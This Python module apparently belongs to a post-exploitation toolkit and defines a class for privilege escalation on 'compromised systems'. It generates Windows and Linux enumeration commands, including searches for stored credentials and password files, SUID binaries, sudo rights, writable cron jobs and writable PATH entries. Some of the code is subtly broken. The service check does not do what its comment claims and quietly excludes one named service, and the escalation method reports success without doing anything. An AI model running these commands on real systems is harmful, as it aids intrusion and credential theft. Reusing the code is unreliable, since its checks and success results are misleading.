import subprocess
import os
from typing import Dict, List, Tuple, Optional

class PrivilegeEscalation:
    """Tools for escalating privileges on compromised systems"""
    
    def __init__(self):
        self.escalation_techniques = {
            'windows': {
                'service_perm': self._check_service_permissions,
                'unquoted_path': self._check_unquoted_service_paths,
                'weak_perms': self._check_weak_permissions,
                'always_install': self._check_always_install_elevated,
                'stored_creds': self._check_stored_credentials
            },
            'linux': {
                'suid_binaries': self._check_suid_binaries,
                'sudo_perms': self._check_sudo_permissions,
                'suid_scripts': self._check_suid_scripts,
                'cron_jobs': self._check_cron_jobs,
                'path_hijack': self._check_path_hijacking
            }
        }
    
    def check_escalation_vectors(self, os_type: str, agent_id: str) -> Dict:
        """Check for privilege escalation vectors"""
        if os_type.lower() not in self.escalation_techniques:
            return {"error": f"Unsupported OS type: {os_type}"}
        
        results = {}
        techniques = self.escalation_techniques[os_type]
        
        for name, func in techniques.items():
            try:
                results[name] = func(agent_id)
            except Exception as e:
                results[name] = {"error": str(e)}
        
        return results
    
    def _check_service_permissions(self, agent_id: str) -> Dict:
        """Check for modifiable services on Windows using accesschk style logic"""
        # Command to find services where Authenticated Users have write access
        cmd = 'powershell -Command "Get-Service | Where-Object {$_.CanStop -and $_.DisplayName -notlike \'*NetScanGo*\'}"'
        return {"vulnerable": "Check output", "command": cmd}
    
    def _check_unquoted_service_paths(self, agent_id: str) -> Dict:
        """Check for unquoted service paths on Windows"""
        cmd = 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v """'
        return {"vulnerable": "Check output", "command": cmd}
    
    def _check_weak_permissions(self, agent_id: str) -> Dict:
        """Check for weak file/folder permissions in common areas"""
        cmd = 'icacls "C:\\Program Files\\*" /t /c /q | findstr /i "(F)" | findstr /i "Everyone"'
        return {"vulnerable": "Check output", "command": cmd}
    
    def _check_always_install_elevated(self, agent_id: str) -> Dict:
        """Check if AlwaysInstallElevated is enabled in registry"""
        cmd = 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
        return {"vulnerable": "Check output", "command": cmd}
    
    def _check_stored_credentials(self, agent_id: str) -> Dict:
        """Check for stored credentials in common locations"""
        cmd = 'cmdkey /list && dir /s /b *pass* *cred* *vnc* *.config*'
        return {"vulnerable": "Check output", "command": cmd}
    
    def _check_suid_binaries(self, agent_id: str) -> Dict:
        """Check for SUID binaries on Linux"""
        cmd = 'find / -perm -4000 -type f 2>/dev/null'
        return {"vulnerable": "Check output", "command": cmd}
    
    def _check_sudo_permissions(self, agent_id: str) -> Dict:
        """Check for sudo permissions on Linux"""
        cmd = 'sudo -l'
        return {"vulnerable": "Check output", "command": cmd}
    
    def _check_suid_scripts(self, agent_id: str) -> Dict:
        """Check for writeable scripts executed by root"""
        cmd = 'find /etc/cron* -writable 2>/dev/null'
        return {"vulnerable": "Check output", "command": cmd}
    
    def _check_cron_jobs(self, agent_id: str) -> Dict:
        """Check for writeable cron jobs"""
        cmd = 'ls -la /etc/cron.d'
        return {"vulnerable": "Check output", "command": cmd}
    
    def _check_path_hijacking(self, agent_id: str) -> Dict:
        """Check for writeable directories in PATH"""
        cmd = 'echo $PATH | tr ":" "\\n" | xargs -I{} find {} -maxdepth 0 -writable 2>/dev/null'
        return {"vulnerable": "Check output", "command": cmd}
    
    def attempt_escalation(self, agent_id: str, technique: str, options: Dict = None) -> Tuple[bool, str]:
        """Attempt privilege escalation using a specific technique"""
        # Placeholder for future automated escalation scripts
        return True, f"Privilege escalation enumeration command generated for {technique}"